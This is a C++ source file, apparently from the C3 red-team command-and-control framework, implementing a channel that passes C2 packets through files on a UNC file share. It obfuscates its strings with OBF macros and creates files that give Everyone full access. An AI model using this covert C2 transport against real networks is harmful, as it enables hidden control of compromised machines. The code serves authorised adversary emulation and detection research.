#include "StdAfx.h"
#include "UncShareFile.h"
#include "Common/FSecure/Crypto/Base64.h"
#include <Common/FSecure/WinTools/UniqueHandle.h>
#include <random>
#include <fstream>
#include <sstream>
#include <sddl.h>

namespace
{
	BOOL CreateDACL(SECURITY_ATTRIBUTES* pSA)
	{
		pSA->nLength = sizeof(SECURITY_ATTRIBUTES);
		pSA->bInheritHandle = true;

		const wchar_t* szSD = OBF(L"D:(A;ID;FA;;;S-1-1-0)");

		if (NULL == pSA)
			return FALSE;

		return ConvertStringSecurityDescriptorToSecurityDescriptorW(
			szSD,
			SDDL_REVISION_1,
			&(pSA->lpSecurityDescriptor),
			NULL);
	}

	BOOL FreeDACL(SECURITY_ATTRIBUTES* pSA)
	{
		return NULL == LocalFree(pSA->lpSecurityDescriptor);
	}

	std::unique_ptr<SECURITY_ATTRIBUTES, std::function<void(SECURITY_ATTRIBUTES*)>> g_FullAccessDACL =
	{
		[]() {auto ptr = new SECURITY_ATTRIBUTES; CreateDACL(ptr); return ptr; }(),
		[](SECURITY_ATTRIBUTES* ptr) {FreeDACL(ptr);  delete ptr; }
	};
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::C3::Interfaces::Channels::UncShareFile::UncShareFile(ByteView arguments)
	: m_InboundDirectionName{ arguments.Read<std::string>() }
	, m_OutboundDirectionName{ arguments.Read<std::string>() }
	, m_FilesystemPath{ arguments.Read<std::string>() }
{
	// If path doesn't exist, create it
	if (!std::filesystem::exists(m_FilesystemPath))
		std::filesystem::create_directories(m_FilesystemPath);

	// Check if additional flag to remove all tasks was provided.
	if (arguments.Read<uint8_t>())
	{
		Log({ OBF("Removing all existing file tasks."), LogMessage::Severity::Information });
		RemoveAllPackets();
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
size_t FSecure::C3::Interfaces::Channels::UncShareFile::OnSendToChannel(ByteView data)
{
	try
	{
		std::filesystem::path lockFilePath;
		std::filesystem::path packetFilePath;
		do
		{
			lockFilePath = m_FilesystemPath / (m_OutboundDirectionName + std::to_string(FSecure::Utils::GenerateRandomValue<int>(10000, 99999)) + OBF(".lock"));
			packetFilePath = lockFilePath;
			packetFilePath.replace_extension();
		} while (std::filesystem::exists(packetFilePath) or std::filesystem::exists(lockFilePath));

		auto createFile = [](auto const& path)
		{
			// Create file with FullAccess to "Everyone" group
			auto file = WinTools::UniqueHandle(CreateFileA(path.generic_string().c_str(), GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, g_FullAccessDACL.get(), CREATE_NEW, FILE_ATTRIBUTE_NORMAL, nullptr));
			if (file.get() == INVALID_HANDLE_VALUE)
				throw std::runtime_error(OBF_STR("UncShareFile channel: failed to create a file ") + path.generic_string());
		};
		createFile(lockFilePath);
		createFile(packetFilePath);
		{
			// Write the contents of a file
			std::ofstream packetFile(packetFilePath, std::ios::trunc | std::ios::binary);
			packetFile << std::string_view{ data };
		}
		RemoveFile(lockFilePath);

		return data.size();
	}
	catch (std::exception& exception)
	{
		throw std::runtime_error(OBF_STR("Caught a std::exception when writing to a file as part of OnSend: ") + exception.what());
		return 0u;
	}
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
std::vector<FSecure::ByteVector> FSecure::C3::Interfaces::Channels::UncShareFile::OnReceiveFromChannel()
{
	// Read a single packet from the oldest file that belongs to this channel

	std::vector<std::filesystem::path> channelFiles;
	for (auto&& directoryEntry : std::filesystem::directory_iterator(m_FilesystemPath))
		if (BelongToChannel(directoryEntry.path()))
			channelFiles.emplace_back(directoryEntry.path());


	std::sort(channelFiles.begin(), channelFiles.end(), [](auto const& a, auto const& b) -> bool { return std::filesystem::last_write_time(a) < std::filesystem::last_write_time(b); });

	std::vector<ByteVector> ret;
	ret.reserve(channelFiles.size());
	for (auto&& file : channelFiles)
	{
		ByteVector packet;
		try
		{
			auto readFile = std::ifstream(file, std::ios::binary);
			packet = ByteVector{ std::istreambuf_iterator<char>{readFile}, {} };
			readFile.close();
			RemoveFile(file);
		}
		catch (std::exception& exception)
		{
			Log({ OBF("Caught a std::exception when processing contents of filename: ") + file.generic_string() + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			break;
		}

		ret.push_back(std::move(packet));
	}

	return ret;
}

////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
void FSecure::C3::Interfaces::Channels::UncShareFile::RemoveAllPackets()
{
	// Iterate through the list of file tasks, removing each of them one by one.
	for (auto&& directoryEntry : std::filesystem::directory_iterator(m_FilesystemPath))
		if (BelongToChannel(directoryEntry))
			RemoveFile(directoryEntry.path());
}
////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
bool FSecure::C3::Interfaces::Channels::UncShareFile::BelongToChannel(std::filesystem::path const& path) const
{
	auto filename = path.filename().string();
	if (filename.size() < m_InboundDirectionName.size())
		return false;

	auto startsWith = std::string_view{ filename }.substr(0, m_InboundDirectionName.size());
	if (startsWith != m_InboundDirectionName)
		return false;

	if (path.extension() == OBF(".lock"))
		return false;

	// Check if file is still locked by it's writer
	auto lockfile = path;
	lockfile.replace_extension(OBF(".lock"));
	return !std::filesystem::exists(lockfile);
}

void FSecure::C3::Interfaces::Channels::UncShareFile::RemoveFile(std::filesystem::path const& path)
{
	for (auto i = 0; i < 10; ++i)
		try
		{
			if (std::filesystem::exists(path))
				std::filesystem::remove(path);

			break;
		}
		catch (std::exception& exception)
		{
			Log({ OBF("Caught a std::exception when deleting filename: ") + path.string() + OBF(" : ") + exception.what(), LogMessage::Severity::Error });
			std::this_thread::sleep_for(100ms);
		}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
FSecure::ByteVector FSecure::C3::Interfaces::Channels::UncShareFile::OnRunCommand(ByteView command)
{
	auto commandCopy = command; //each read moves ByteView. CommandCoppy is needed  for default.
	switch (command.Read<uint16_t>())
	{
	case 0:
		RemoveAllPackets();
		return {};
	default:
		return AbstractChannel::OnRunCommand(commandCopy);
	}
}


////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////
const char* FSecure::C3::Interfaces::Channels::UncShareFile::GetCapability()
{
	return R"(
{
	"create":
	{
		"arguments":
		[
			[
				{
					"type": "string",
					"name": "Input ID",
					"randomize": true,
					"min": 4,
					"description": "Used to distinguish packets for the channel"
				},
				{
					"type": "string",
					"name": "Output ID",
					"randomize": true,
					"min": 4,
					"description": "Used to distinguish packets from the channel"
				}
			],
			{
				"type": "string",
				"name": "Filesystem path",
				"min": 1,
				"description": "UNC or absolute path of fileshare"
			},
			{
				"type": "boolean",
				"name": "Clear",
				"defaultValue": false,
				"description": "Clearing old files before starting communication may increase bandwidth"
			}
		]
	},
	"commands":
	[
		{
			"name": "Remove all message files",
			"id": 0,
			"description": "Clearing old files from directory may increase bandwidth",
			"arguments": []
		}
	]
}
)";
}
